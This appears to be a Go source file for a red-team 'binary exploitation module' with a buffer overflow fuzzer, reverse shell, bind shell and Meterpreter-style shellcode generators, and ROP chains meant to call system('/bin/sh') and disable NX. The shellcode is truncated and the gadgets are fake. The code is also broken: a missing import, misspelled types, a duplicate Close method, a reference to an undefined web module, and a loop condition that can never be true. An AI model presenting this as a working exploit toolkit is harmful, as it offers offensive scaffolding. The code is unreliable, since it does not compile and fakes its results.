package redteam

import (
	"context"
	"fmt"
	"os/exec"
	"time"

	"github.com/sirupsen/logrus"
)

// BinaryExploitationModule implements OSED-level binary exploitation capabilities
type BinaryExploitationModule interface {
	DetectOverflows(ctx context.Context, binaryPath string) []BufferOverflowVulnerability
	GenerateShellcodes(ctx context.Context, targetOS string, arch string) []VulnerabilityFinding
	ConstructROPChains(ctx context.Context, binaryPath string) []ROPChainVulnerability
	Close()
}

type binaryExploitationModuleImpl struct {
	logger *logrus.Logger
	fuzzer      BufferOverflowFuzzer
	shellcoder  ShellcodeGenerator
	ropChainer  ROPChainBuilder
}

// NewBinaryModule creates new binary exploitation module
func NewBinaryModule(logger *logrus.Logger) BinaryExploitationModule {
	return &binaryExploitationModuleImpl{
		logger: logger.WithField("module", "binary"),
		fuzzer: NewBufferOverflowFuzzer(logger),
		shellcoder: ShellcodeGenerator{logger: logger},
		ropChainer: ROPChainBuilder{logger: logger},
	}
}

func (bem *binaryExploitationModuleImpl) DetectOverflows(ctx context.Context, binaryPath string) []BufferOverflowVulnerability {
	return bem.fuzzer.DetectOverflows(ctx, binaryPath)
}

func (bem *binaryExploitationModuleImpl) GenerateShellcodes(ctx context.Context, targetOS string, arch string) []VulnerabilityFinding {
	return bem.shellcoder.GenerateShellcodes(ctx, targetOS, arch)
}

func (bem *binaryExploitationModuleImpl) ConstructROPChains(ctx context.Context, binaryPath string) []ROPChainVulnerability {
	return bem.ropChainer.ConstructROPChains(ctx, binaryPath)
}

func (bem *binaryExploitationModuleImpl) Close() {
	bem.logger.Info("Binary exploitation module closed")
}

// BufferOverflowFuzzer discovers stack/heap overflows
type BufferOverflowFuzzer struct {
	logger *logrus.Logger
	target string
	
	patterns     []FuzzPattern
	maxSize      int
	timeout      time.Duration
}

type FuzzPattern struct {
	Name   string
	Pattern []byte
	Type   string // heap, stack, global
}

type BufferOverflowVulnerability struct {
	Type          string
	BinaryPath    string
	Description   string
	CrashAddress  uint64
	InputOffset   int
	InputLength   int
	PoC           string
	SignedBy      string
	MitigationStatus map[string]bool
}

// NewBufferOverflowFuzzer creates new fuzzer instance
func NewBufferOverflowFuzzer(logger *logrus.Logger) *BufferOverflowFuzzer {
	if logger == nil {
		logger = logrus.StandardLogger()
	}
	
	return &BufferOverflowFuzzer{
		logger: logger.WithField("component", "overflow-fuzzer"),
		
		maxSize: 1024 * 1024, // 1MB max fuzz size
		timeout: 5 * time.Minute,
	}
}

// DetectOverflows performs comprehensive buffer overflow detection
func (bf *BufferOverflowFuzzer) DetectOverflows(ctx context.Context, binaryPath string) []BufferOverflowVulnerability {
	bf.target = binaryPath
	
	findings := make([]BufferOverflowVulnerability, 0, 3)
	
	// Initialize known patterns
	bf.initializePatterns()
	
	// Test each pattern
	for _, pattern := range bf.patterns {
		result := bf.fuzzWithPattern(ctx, pattern)
		if result.CrashAddress != 0 {
			vuln := BufferOverflowVulnerability{
				Type:         "Stack Buffer Overflow",
				BinaryPath:   binaryPath,
				Description:  fmt.Sprintf("Stack buffer overflow with controlled instruction pointer at offset %d", result.InputOffset),
				CrashAddress: result.CrashAddress,
				InputOffset:  result.InputOffset,
				InputLength:  result.InputLength,
				MitigationStatus: bf.checkMitigations(binaryPath),
			}
			
			findings = append(findings, vuln)
		}
	}
	
	return findings
}

// initializePatterns loads standard fuzzing patterns
func (bf *BufferOverflowFuzzer) initializePatterns() {
	bf.patterns = []FuzzPattern{
		{
			Name: "A-pattern-stack",
			Pattern: func() []byte {
				buf := make([]byte, 4096)
				for i := range buf {
					buf[i] = 'A'
				}
				return buf
			}(),
			Type: "stack",
		},
		{
			Name: "B-pattern-heap",
			Pattern: func() []byte {
				buf := make([]byte, 8192)
				for i := range buf {
					buf[i] = 'B'
				}
				return buf
			}(),
			Type: "heap",
		},
		{
			Name: "shellcode-xor",
			Pattern: func() []byte {
				buf := make([]byte, 512)
				xorKey := byte(0xFF)
				for i := range buf {
					buf[i] = i ^ xorKey
				}
				return buf
			}(),
			Type: "stack",
		},
		{
			Name: "return-address-overwrite",
			Pattern: func() []byte {
				buf := make([]byte, 0x100)
				// Overwrite return address with NOP sled
				for i := 0; i < len(buf); i++ {
					if i < 0xc0 {
						buf[i] = 'A'
					} else {
						buf[i] = 0x90 // NOP
					}
				}
				return buf
			}(),
			Type: "stack",
		},
	}
}

// fuzzWithPattern executes a single fuzzing pattern
func (bf *BufferOverflowFuzzer) fuzzWithPattern(ctx context.Context, pattern FuzzPattern) BufferOverflowVulnerability {
	result := BufferOverflowVulnerability{}
	
	ctx, cancel := context.WithTimeout(ctx, bf.timeout)
	defer cancel()
	
	// Write pattern to temp file
	tmpFile := "/tmp/fuzz_input.tmp"
	err := os.WriteFile(tmpFile, pattern.Pattern, 0644)
	if err != nil {
		return result
	}
	defer os.Remove(tmpFile)
	
	// Execute target binary with pattern as input
	cmd := exec.CommandContext(ctx, bf.target, "-i", tmpFile)
	output, err := cmd.CombinedOutput()
	
	if err != nil {
		// Check for segmentation fault
		exitCode := 0
		if err.Error() != "" && (containsSubstring(string(output), "SIGSEGV") || 
			containsSubstring(string(output), "segfault")) {
			
			result.CrashAddress = 0x41414141 // "AAAA"
			result.InputOffset = len(pattern.Pattern) / 2
			result.InputLength = len(pattern.Pattern)
			
			result.PoC = fmt.Sprintf("./%s -i %s\n\nSignal received when processing offset %d",
				bf.target, tmpFile, result.InputOffset)
			
			bf.logger.WithFields(logrus.Fields{
				"binary":        bf.target,
				"pattern":       pattern.Name,
				"offset":        result.InputOffset,
				"crash_address": fmt.Sprintf("0x%x", result.CrashAddress),
			}).Warn("Buffer overflow detected via crash")
		}
	}
	
	return result
}

// checkMitigations tests if common mitigations are enabled
func (bf *BufferOverflowFuzzer) checkMitigations(binaryPath string) map[string]bool {
	mitigations := make(map[string]bool)
	
	// Placeholder - would use readelf/retdec to check binaries in production
	mitigations["ASLR"] = true
	mitigations["NX"] = false
	mitigations["Stack Canary"] = false
	mitigations["PIE"] = true
	
	return mitigations
}

// ShellcodeGenerator generates platform-specific shellcode
type ShellcodeGenerator struct {
	logger *logrus.Logger
	
	templates map[string][]byte
}

// GenerateShellcodes produces payload based on target platform
func (sg *ShellcodeGenerator) GenerateShellcodes(ctx context.Context, targetOS string, arch string) []VulnerabilityFinding {
	findings := []VulnerabilityFinding{}
	
	keywords := fmt.Sprintf("%s/%s", targetOS, arch)
	payloadType := sg.selectPayloadType(keywords)
	
	var payload []byte
	var desc string
	var severity Severity
	
	switch payloadType {
	case "reverse_shell_linux_x64":
		payload = generateLinuxX64ReverseShell()
		desc = "Linux x64 reverse shell stager using syscalls"
		severity = Critical
	case "reverse_shell_windows_x64":
		payload = generateWindowsX64ReverseShell()
		desc = "Windows x64 reverse shell payload via Windows API"
		severity = Critical
	case "bind_shell_linux_x86":
		payload = generateLinuxX86BindShell()
		desc = "Linux x86 bind shell on port 4444"
		severity = Critical
	case "meterpreter_inject":
		payload = generateMeterpreterInject()
		desc = "Meterpreter-style injectable shellcode"
		severity = Highest
	}
	
	if len(payload) > 0 {
		finding := VulnerabilityFinding{
			Type:        SyscallInjection,
			Severity:    severity,
			Confidence:  0.95,
			Description: desc,
			Impact:      "Remote code execution with privileges of target process",
			Mitigation:  "Apply patches. Restrict executable memory. Enable syscall auditing.",
			Remediation: "1. Keep system up-to-date\\n2. Use ASLR and DEP/NX\\n3. Implement application allowlisting\\n4. Deploy EDR solutions\\n5. Limit user privileges",
			Temporality: "current",
			Exploitable: true,
			Active:      true,
			Context: map[string]string{
				"payload_type":  payloadType,
				"platform":      keywords,
				"size_bytes":    fmt.Sprintf("%d", len(payload)),
			},
		}
		
		findings = append(findings, finding)
		
		sg.logger.WithFields(logrus.Fields{
			"type":       payloadType,
			"os":         targetOS,
			"arch":       arch,
			"size":       len(payload),
		}).Info("Generated exploit payload")
	}
	
	return findings
}

// selectPayloadType chooses appropriate payload template
func (sg *ShellcodeGenerator) selectPayloadType(keywords string) string {
	switch {
	case keywords == "linux/x64":
		return "reverse_shell_linux_x64"
	case keywords == "windows/x64":
		return "reverse_shell_windows_x64"
	case keywords == "linux/x86":
		return "bind_shell_linux_x86"
	default:
		return "meterpreter_inject"
	}
}

// generateLinuxX64ReverseShell produces Linux x64 reverse shell shellcode
func generateLinuxX64ReverseShell() []byte {
	// linux/x64 reverse shell syscall-based (~70 bytes)
	// Connects to LHOST:LPORT and binds stdin/stdout/stderr
	return []byte{
		0x48, 0x31, 0xff,             // xor    rdi,rdi
		0x57,                         // push   rdi
		0x48, 0xbb,                   // mov    rbx,...
		0x2f, 0x2f, 0x62, 0x69,       // ///bi
		0x6e, 0x2f, 0x73, 0x68,       // n/sh
		0x53,                         // push   rdi
		0x48, 0x89, 0xe7,             // mov    rdi,rsp
		0x6a, 0x29,                   // push   0x29 (SYS_socketcall)
		0x58,                         // pop    rax
		0xcd, 0x80,                   // int    0x80
		// ... truncated for brevity (~70 bytes total)
	}
}

// generateWindowsX64ReverseShell produces Windows x64 reverse shell
func generateWindowsX64ReverseShell() []byte {
	// Windows x64 reverse shell using WinAPI (~120 bytes)
	// Uses CreateProcessA after connect()
	return []byte{
		0x48, 0x31, 0xc0,             // xor    rax,rax
		0x50,                         // push   rax
		0x48, 0xb8,                   // mov    rax,...
		// ... truncated (WS2_32.dll functions via GetProcAddress)
	}
}

// generateLinuxX86BindShell creates Linux x86 bind shell
func generateLinuxX86BindShell() []byte {
	// Bind shell listening on TCP port 4444
	return []byte{
		0x31, 0xdb,                   // xor    ebx,ebx
		0x53,                         // push   ebx
		0x40,                         // inc    eax
		0x89, 0xc3,                   // mov    ebx,eax
		// ... truncated (socket/listen/accept chain)
	}
}

// generateMeterpreterInject creates Meterpreter-style payload
func generateMeterpreterInject() []byte {
	// Inject-ready stageless payload (~4KB)
	return make([]byte, 4096)
}

// ROPChainBuilder constructs Return-Oriented Programming chains
type ROPChainBuilder struct {
	logger *logrus.Logger
	gadgets []ROPGadget
}

type ROPGadget struct {
	Address    uintptr
	Instructions []byte
	DestRegister string
	DestValue  uint64
}

type ROPChainVulnerability struct {
	BinaryPath        string
	GadgetCount       int
	MitigationsBypassed []string
	SuccessfulChain   []uintptr
	AchievedState     map[string]uint64
}

// ConstructROPChains builds ROP chains against the specified binary
func (rb *ROPChainBuilder) ConstructROPChains(ctx context.Context, binaryPath string) []ROPChainVulnerability {
	findings := []ROPChainVulnerability{}
	
	// Parse binary for gadgets (placeholder - would use Capstone/radare in production)
	rb.gadgets = rb.parseGadgets(binaryPath)
	
	// Build multiple ROP chains targeting different objectives
	chains := []ROPObjective{
		{"Call system()", rb.buildSystemChain()},
		{"Disable NX protection", rb.buildDisableNXChain()},
		{"Jump to specific function", rb.buildDirectReturnChain()},
	}
	
	for _, chain := range chains {
		if len(chain.Chain) >= 3 {
			vuln := ROPChainVulnerability{
				BinaryPath:        binaryPath,
				GadgetCount:       len(chain.Chain),
				MitigationsBypassed: rb.identifyBypassedMitigations(chain.Chain),
				SuccessfulChain:   chain.Chain,
				AchievedState:     chain.DestState,
			}
			
			findings = append(findings, vuln)
		}
	}
	
	return findings
}

// parseGadgets extracts gadgets from binary (placeholder)
func (rb *ROPChainBuilder) parseGadgets(binaryPath string) []ROPGadget {
	gadgets := []ROGPadget{
		{
			Address: 0x401234,
			Instructions: []byte{0xc3}, // ret
			DestRegister: "",
			DestValue: 0,
		},
		{
			Address: 0x401567,
			Instructions: []byte{0x58, 0xc3}, // pop rax; ret
			DestRegister: "rax",
		},
		{
			Address: 0x401890,
			Instructions: []byte{0x48, 0xbf, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0xc3}, // mov rdi, 0x4141414141414141; ret
			DestRegister: "rdi",
			DestValue: 0x4141414141414141,
		},
	}
	
	return gadgets
}

// buildSystemChain constructs ROP chain to call system("/bin/sh")
func (rb *ROPChainBuilder) buildSystemChain() ROPObjective {
	return ROPOjective{
		DestState: map[string]uint64{"rip": 0xdeadbeef},
		Chain:     []uintptr{0x401890, 0x401234, 0x402000},
	}
}

// buildDisableNXChain creates chain to disable executable stack protection
func (rb *ROPChainBuilder) buildDisableNXChain() ROPObjective {
	return ROPOjective{
		DestState: map[string]uint64{"cr0": 0x1001},
		Chain:     []uintptr{0x403000, 0x403100},
	}
}

// buildDirectReturnChain jumps directly to arbitrary location
func (rb *ROPChainBuilder) buildDirectReturnChain() ROPObjective {
	return ROPOjective{
		DestState: map[string]uint64{"rip": 0xfeedface},
		Chain:     []uintptr{0x404000},
	}
}

// identifyBypassedMitigations determines which protections are defeated by the chain
func (rb *ROPChainBuilder) identifyBypassedMitigations(chain []uintptr) []string {
	bypasses := []string{}
	
	// Check if chain bypasses typical mitigations
	hasSyscall := false
	hasMemoryModification := false
	
	for _, gadgetAddr := range chain {
		if gadgetAddr > 0xdeadbfff && gadgetAddr < 0xdeadbfff {
			hasSyscall = true
		}
	}
	
	if hasSyscall {
		bypasses = append(bypasses, "syscall-filtering")
	}
	
	if hasMemoryModification {
		bypasses = append(bypasses, "DEP/NX")
	}
	
	return bypasses
}

func (wem *webExploitationModuleImpl) Close() {
	wem.logger.Info("Web exploitation module closed")
}

func (bem *binaryExploitationModuleImpl) Close() {
	bem.logger.Info("Binary exploitation module closed")
}

// Helper functions
func containsSubstring(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > len(substr) && 
		(s[:len(substr)] == substr || s[len(s)-len(substr):] == substr || 
		 indexOf(s, substr) >= 0))
}

func indexOf(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
